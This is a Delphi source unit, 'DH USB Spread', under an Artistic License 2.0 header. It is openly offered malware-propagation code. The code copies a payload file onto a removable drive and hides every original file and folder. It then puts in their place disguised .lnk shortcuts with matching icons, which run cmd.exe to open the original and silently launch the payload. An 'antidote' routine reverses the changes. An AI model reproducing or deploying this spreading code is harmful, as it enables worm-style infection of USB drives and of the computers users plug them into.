{
  This software is Copyright (c) 2016 by Doddy Hackman.
  This is free software, licensed under:
  The Artistic License 2.0
  The Artistic License
  Preamble
  This license establishes the terms under which a given free software Package may be copied, modified, distributed, and/or redistributed. The intent is that the Copyright Holder maintains some artistic control over the development of that Package while still keeping the Package available as open source and free software.
  You are always permitted to make arrangements wholly outside of this license directly with the Copyright Holder of a given Package. If the terms of this license do not permit the full use that you propose to make of the Package, you should contact the Copyright Holder and seek a different licensing arrangement.
  Definitions
  "Copyright Holder" means the individual(s) or organization(s) named in the copyright notice for the entire Package.
  "Contributor" means any party that has contributed code or other material to the Package, in accordance with the Copyright Holder's procedures.
  "You" and "your" means any person who would like to copy, distribute, or modify the Package.
  "Package" means the collection of files distributed by the Copyright Holder, and derivatives of that collection and/or of those files. A given Package may consist of either the Standard Version, or a Modified Version.
  "Distribute" means providing a copy of the Package or making it accessible to anyone else, or in the case of a company or organization, to others outside of your company or organization.
  "Distributor Fee" means any fee that you charge for Distributing this Package or providing support for this Package to another party. It does not mean licensing fees.
  "Standard Version" refers to the Package if it has not been modified, or has been modified only in ways explicitly requested by the Copyright Holder.
  "Modified Version" means the Package, if it has been changed, and such changes were not explicitly requested by the Copyright Holder.
  "Original License" means this Artistic License as Distributed with the Standard Version of the Package, in its current version or as it may be modified by The Perl Foundation in the future.
  "Source" form means the source code, documentation source, and configuration files for the Package.
  "Compiled" form means the compiled bytecode, object code, binary, or any other form resulting from mechanical transformation or translation of the Source form.
  Permission for Use and Modification Without Distribution
  (1) You are permitted to use the Standard Version and create and use Modified Versions for any purpose without restriction, provided that you do not Distribute the Modified Version.
  Permissions for Redistribution of the Standard Version
  (2) You may Distribute verbatim copies of the Source form of the Standard Version of this Package in any medium without restriction, either gratis or for a Distributor Fee, provided that you duplicate all of the original copyright notices and associated disclaimers. At your discretion, such verbatim copies may or may not include a Compiled form of the Package.
  (3) You may apply any bug fixes, portability changes, and other modifications made available from the Copyright Holder. The resulting Package will still be considered the Standard Version, and as such will be subject to the Original License.
  Distribution of Modified Versions of the Package as Source
  (4) You may Distribute your Modified Version as Source (either gratis or for a Distributor Fee, and with or without a Compiled form of the Modified Version) provided that you clearly document how it differs from the Standard Version, including, but not limited to, documenting any non-standard features, executables, or modules, and provided that you do at least ONE of the following:
  (a) make the Modified Version available to the Copyright Holder of the Standard Version, under the Original License, so that the Copyright Holder may include your modifications in the Standard Version.
  (b) ensure that installation of your Modified Version does not prevent the user installing or running the Standard Version. In addition, the Modified Version must bear a name that is different from the name of the Standard Version.
  (c) allow anyone who receives a copy of the Modified Version to make the Source form of the Modified Version available to others under
  (i) the Original License or
  (ii) a license that permits the licensee to freely copy, modify and redistribute the Modified Version using the same licensing terms that apply to the copy that the licensee received, and requires that the Source form of the Modified Version, and of any works derived from it, be made freely available in that license fees are prohibited but Distributor Fees are allowed.
  Distribution of Compiled Forms of the Standard Version or Modified Versions without the Source
  (5) You may Distribute Compiled forms of the Standard Version without the Source, provided that you include complete instructions on how to get the Source of the Standard Version. Such instructions must be valid at the time of your distribution. If these instructions, at any time while you are carrying out such distribution, become invalid, you must provide new instructions on demand or cease further distribution. If you provide valid instructions or cease distribution within thirty days after you become aware that the instructions are invalid, then you do not forfeit any of your rights under this license.
  (6) You may Distribute a Modified Version in Compiled form without the Source, provided that you comply with Section 4 with respect to the Source of the Modified Version.
  Aggregating or Linking the Package
  (7) You may aggregate the Package (either the Standard Version or Modified Version) with other packages and Distribute the resulting aggregation provided that you do not charge a licensing fee for the Package. Distributor Fees are permitted, and licensing fees for other components in the aggregation are permitted. The terms of this license apply to the use and Distribution of the Standard or Modified Versions as included in the aggregation.
  (8) You are permitted to link Modified and Standard Versions with other works, to embed the Package in a larger work of your own, or to build stand-alone binary or bytecode versions of applications that include the Package, and Distribute the result without restriction, provided the result does not expose a direct interface to the Package.
  Items That are Not Considered Part of a Modified Version
  (9) Works (including, but not limited to, modules and scripts) that merely extend or make use of the Package, do not, by themselves, cause the Package to be a Modified Version. In addition, such works are not considered parts of the Package itself, and are not subject to the terms of this license.
  General Provisions
  (10) Any use, modification, and distribution of the Standard or Modified Versions is governed by this Artistic License. By using, modifying or distributing the Package, you accept this license. Do not use, modify, or distribute the Package, if you do not accept this license.
  (11) If your Modified Version has been derived from a Modified Version made by someone other than you, you are nevertheless required to ensure that your Modified Version complies with the requirements of this license.
  (12) This license does not grant you the right to use any trademark, service mark, tradename, or logo of the Copyright Holder.
  (13) This license includes the non-exclusive, worldwide, free-of-charge patent license to make, have made, use, offer to sell, sell, import and otherwise transfer the Package with respect to any patent claims licensable by the Copyright Holder that are necessarily infringed by the Package. If you institute patent litigation (including a cross-claim or counterclaim) against any party alleging that the Package constitutes direct or contributory patent infringement, then this Artistic License to you shall terminate on the date that such litigation is filed.
  (14) Disclaimer of Warranty: THE PACKAGE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES. THE IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT ARE DISCLAIMED TO THE EXTENT PERMITTED BY YOUR LOCAL LAW. UNLESS REQUIRED BY LAW, NO COPYRIGHT HOLDER OR CONTRIBUTOR WILL BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, OR CONSEQUENTIAL DAMAGES ARISING IN ANY WAY OUT OF THE USE OF THE PACKAGE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
}

// Unit : DH USB Spread 0.6
// (C) Doddy Hackman 2016

unit DH_USB_Spread;

interface

uses SysUtils, Windows, ActiveX, ShlObj, ComObj,
  ShellAPI;

type
  T_DH_USB_Spread = class
  private

  public
    constructor Create;
    destructor Destroy; override;
    function normal_file(filename: string): bool;
    function hide_file(filename: string): bool;
    function convert_path(path: string): string;
    function make_shortcut(shortcut: string; path: string;
      set_working_dir: string; arguments: string; path_icon: string;
      icon_index: integer; hide: boolean): boolean;
    function get_extension(filename: string): string;
    function get_filename_without_extension(filename: string): string;
    function get_icon_filename_imageres(filename: string): integer;
    function get_icon_filename_shell32(filename: string): integer;
    function generateSpreadFolder(shortcut_file: string; malware_file: string;
      folder_to: string): boolean;
    function generateSpreadFile(shortcut_file: string; malware_file: string;
      file_to: string): boolean;
    function check_drive(target: string): boolean;
    function USB_Spread(folder: string; malware: string;
      malware_new_name: string; only_usb: boolean): boolean;
    function USB_Spread_Antidote(folder: string; malware_new_name: string;
      only_usb: boolean): boolean;
  end;

implementation

constructor T_DH_USB_Spread.Create;
begin
  inherited Create;
  //
end;

destructor T_DH_USB_Spread.Destroy;
begin
  inherited Destroy;
end;

function T_DH_USB_Spread.normal_file(filename: string): bool;
begin
  try
    begin
      if (FileExists(filename) or DirectoryExists(filename)) then
      begin
        SetFileAttributes(Pchar(filename), FILE_ATTRIBUTE_NORMAL);
        Result := True;
      end
      else
      begin
        Result := False;
      end;
    end;
  except
    Result := False;
  end;
end;

function T_DH_USB_Spread.hide_file(filename: string): bool;
begin
  try
    begin
      if (FileExists(filename) or DirectoryExists(filename)) then
      begin
        SetFileAttributes(Pchar(filename), FILE_ATTRIBUTE_HIDDEN);
        Result := True;
      end
      else
      begin
        Result := False;
      end;
    end;
  except
    Result := False;
  end;
end;

function T_DH_USB_Spread.convert_path(path: string): string;
begin
  path := StringReplace(path, ' ', Char(34) + ' ' + Char(34),
    [rfReplaceAll, rfIgnoreCase]);
  Result := path;
end;

// Credits : http://stackoverflow.com/questions/4970075/do-windows-shortcuts-support-very-long-argument-lengths/12414801
// Thanks to David Heffernan

function T_DH_USB_Spread.make_shortcut(shortcut: string; path: string;
  set_working_dir: string; arguments: string; path_icon: string;
  icon_index: integer; hide: boolean): boolean;
var
  shell_link: IShellLinkW;
  persist_file: IPersistFile;
begin
  if not(shortcut = '') and not(path = '') then
  begin
    try
      begin
        CoCreateInstance(CLSID_ShellLink, nil, CLSCTX_INPROC_SERVER,
          IID_IShellLinkW, shell_link);
        shell_link.SetPath(Pchar(path));
        shell_link.SetWorkingDirectory(Pchar(set_working_dir));
        shell_link.SetArguments(Pchar(arguments));
        if not(path_icon = '') then
        begin
          shell_link.setIconLocation((Pchar(path_icon)), icon_index);
        end;
        if (hide = True) then
        begin
          shell_link.SetShowCmd(SW_SHOWMINNOACTIVE);
        end;
        persist_file := shell_link as IPersistFile;
        persist_file.save(Pchar(shortcut), False);
        Result := True;
      end;
    except
      begin
        Result := False;
      end;
    end;
  end
  else
  begin
    Result := False;
  end;
end;

function T_DH_USB_Spread.get_extension(filename: string): string;
var
  ext: string;
begin
  ext := '';
  ext := LowerCase(ExtractFileExt(filename));
  ext := StringReplace(ext, '.', '', [rfReplaceAll, rfIgnoreCase]);
  Result := ext;
end;

function T_DH_USB_Spread.get_filename_without_extension
  (filename: string): string;
var
  name: string;
begin
  name := '';
  name := ExtractFileName(filename);
  name := StringReplace(name, ExtractFileExt(filename), '',
    [rfReplaceAll, rfIgnoreCase]);
  Result := name;
end;

function T_DH_USB_Spread.get_icon_filename_imageres(filename: string): integer;
var
  ext: string;
  icon_index: integer;
begin

  icon_index := 0;

  ext := get_extension(filename);

  if (ext = 'mp3') or (ext = 'wav') or (ext = 'flac') then
  begin
    icon_index := 125;
  end

  else if (ext = 'avi') or (ext = 'mp4') or (ext = 'mkv') or (ext = 'mpeg') or
    (ext = 'mpg') or (ext = 'flv') or (ext = 'wmv') or (ext = 'mov') then
  begin
    icon_index := 18;
  end

  else if (ext = 'jpg') or (ext = 'jpeg') or (ext = 'png') or (ext = 'bmp') or
    (ext = 'gif') or (ext = 'tif') or (ext = 'tiff') or (ext = 'psd') then
  begin
    icon_index := 67;
  end

  else if (ext = 'htm') or (ext = 'html') or (ext = 'php') or (ext = 'xml') or
    (ext = 'css') or (ext = 'js') then
  begin
    icon_index := 188;
  end

  else if (ext = 'bat') or (ext = 'vbs') then
  begin
    icon_index := 63;
  end

  else if (ext = 'txt') then
  begin
    icon_index := 97;
  end

  else if (ext = 'zip') or (ext = 'rar') then
  begin
    icon_index := 165;
  end

  else if (ext = 'doc') or (ext = 'docx') or (ext = 'xls') or (ext = 'xlsx') or
    (ext = 'ppt') or (ext = 'pptx') or (ext = 'pubx') or (ext = 'pdf') then
  begin
    icon_index := 188;
  end
  else
  begin
    icon_index := 3;
  end;

  Result := icon_index;

end;

function T_DH_USB_Spread.get_icon_filename_shell32(filename: string): integer;
var
  ext: string;
  icon_index: integer;
begin

  icon_index := 0;

  ext := get_extension(filename);

  if (ext = 'mp3') or (ext = 'wav') or (ext = 'flac') then
  begin
    icon_index := 117;
  end

  else if (ext = 'avi') or (ext = 'mp4') or (ext = 'mkv') or (ext = 'mpeg') or
    (ext = 'mpg') or (ext = 'flv') or (ext = 'wmv') or (ext = 'mov') then
  begin
    icon_index := 116;
  end

  else if (ext = 'jpg') or (ext = 'jpeg') or (ext = 'png') or (ext = 'bmp') or
    (ext = 'gif') or (ext = 'tif') or (ext = 'tiff') or (ext = 'psd') then
  begin
    icon_index := 303;
  end

  else if (ext = 'htm') or (ext = 'html') or (ext = 'php') or (ext = 'xml') or
    (ext = 'css') or (ext = 'js') then
  begin
    icon_index := 2;
  end

  else if (ext = 'bat') or (ext = 'vbs') then
  begin
    icon_index := 170;
  end

  else if (ext = 'txt') then
  begin
    icon_index := 71;
  end

  else if (ext = 'zip') or (ext = 'rar') then
  begin
    icon_index := 206;
  end

  else if (ext = 'doc') or (ext = 'docx') or (ext = 'xls') or (ext = 'xlsx') or
    (ext = 'ppt') or (ext = 'pptx') or (ext = 'pubx') or (ext = 'pdf') then
  begin
    icon_index := 2;
  end
  else
  begin
    icon_index := 1;
  end;

  Result := icon_index;

end;

function T_DH_USB_Spread.generateSpreadFolder(shortcut_file: string;
  malware_file: string; folder_to: string): boolean;
var
  path, set_working_dir, arguments, path_icon: string;
  icon_index: integer;
begin
  if not(shortcut_file = '') and not(malware_file = '') and not(folder_to = '')
  then
  begin
    path := 'cmd.exe';
    path_icon := 'c:\windows\system32\imageres.dll';
    icon_index := 4;
    set_working_dir := '';
    folder_to := '"" "' + folder_to + '\"';
    malware_file := convert_path(malware_file);
    arguments := '/c start ' + folder_to + '&start ' + malware_file + '&exit';

    if (make_shortcut(shortcut_file, path, set_working_dir, arguments,
      path_icon, icon_index, True)) then
    begin
      Result := True;
    end
    else
    begin
      Result := False;
    end;
  end
  else
  begin
    Result := False;
  end;
end;

function T_DH_USB_Spread.generateSpreadFile(shortcut_file: string;
  malware_file: string; file_to: string): boolean;
var
  path, path_icon, set_working_dir, arguments: string;
  icon_index: integer;
begin
  if not(shortcut_file = '') and not(malware_file = '') and not(file_to = '')
  then
  begin
    path := 'cmd.exe';

    if (get_extension(file_to) = 'exe') then
    begin
      path_icon := file_to;
      icon_index := 0;
    end
    else
    begin
      // path_icon := 'c:\windows\system32\shell32.dll';
      path_icon := 'c:\windows\system32\imageres.dll';
      // icon_index := get_icon_filename_shell32(file_to);
      icon_index := get_icon_filename_imageres(file_to);
    end;

    set_working_dir := '';
    file_to := convert_path(file_to);
    malware_file := convert_path(malware_file);
    arguments := '/c start ' + file_to + '&start ' + malware_file + '&exit';

    if (make_shortcut(shortcut_file, path, set_working_dir, arguments,
      path_icon, icon_index, True)) then
    begin
      Result := True;
    end
    else
    begin
      Result := False;
    end;
  end
  else
  begin
    Result := False;
  end;
end;

function T_DH_USB_Spread.check_drive(target: string): boolean;
var
  a, b, c: cardinal;
begin
  Result := GetVolumeInformation(Pchar(target), nil, 0, @c, a, b, nil, 0);
end;

function T_DH_USB_Spread.USB_Spread(folder: string; malware: string;
  malware_new_name: string; only_usb: boolean): boolean;
var
  searcher: TSearchRec;
  fullpath: string;
  response: boolean;
  counter: integer;
begin

  response := False;
  counter := 0;

  if not(folder = '') and not(malware = '') then
  begin
    if (only_usb = True) and not(check_drive(Pchar(folder)) = True) and
      not(GetDriveType(Pchar(folder)) = DRIVE_REMOVABLE) then
    begin
      Result := False;
    end
    else
    begin
      CopyFile(Pchar(malware), Pchar(folder + '\' + malware_new_name), True);
      if FindFirst(folder + '*.*', faAnyFile, searcher) = 0 then
      begin
        repeat
          if not(searcher.name = '.') and not(searcher.name = '..') and
            not(searcher.name = malware_new_name) then
          begin
            fullpath := folder + searcher.name;
            if (searcher.Attr = faDirectory) then
            begin
              if (generateSpreadFolder(folder + searcher.name + '.lnk',
                malware_new_name, fullpath)) then
              begin
                Inc(counter);
              end;
              hide_file(fullpath);
            end
            else
            begin
              if not(ExtractFileExt(fullpath) = '.lnk') then
              begin
                if (generateSpreadFile(folder + '\' +
                  get_filename_without_extension(searcher.name) + '.lnk',
                  malware_new_name, fullpath)) then
                begin
                  Inc(counter);
                end;
                hide_file(fullpath);
              end;
            end;
          end;
        until FindNext(searcher) <> 0;
        SysUtils.FindClose(searcher);
      end;
    end;

    if (counter > 0) then
    begin
      response := True;
    end
    else
    begin
      response := False;
    end;

  end;

  Result := response;

end;

function T_DH_USB_Spread.USB_Spread_Antidote(folder: string;
  malware_new_name: string; only_usb: boolean): boolean;
var
  searcher: TSearchRec;
  fullpath: string;
  response: boolean;
  counter: integer;
begin

  response := False;
  counter := 0;

  if not(folder = '') then
  begin
    if (only_usb = True) and not(check_drive(Pchar(folder)) = True) and
      not(GetDriveType(Pchar(folder)) = DRIVE_REMOVABLE) then
    begin
      Result := False;
    end
    else
    begin
      DeleteFile(Pchar(folder + '\' + malware_new_name));
      if FindFirst(folder + '*.*', faAnyFile, searcher) = 0 then
      begin
        repeat
          if not(searcher.name = '.') and not(searcher.name = '..') then
          begin
            fullpath := folder + searcher.name;
            normal_file(fullpath);
            if (ExtractFileExt(fullpath) = '.lnk') then
            begin
              DeleteFile(Pchar(fullpath));
              Inc(counter);
            end;
          end;
        until FindNext(searcher) <> 0;
        SysUtils.FindClose(searcher);
      end;
    end;

    if (counter > 0) then
    begin
      response := True;
    end
    else
    begin
      response := False;
    end;

  end;

  Result := response;

end;

end.

// The End ?
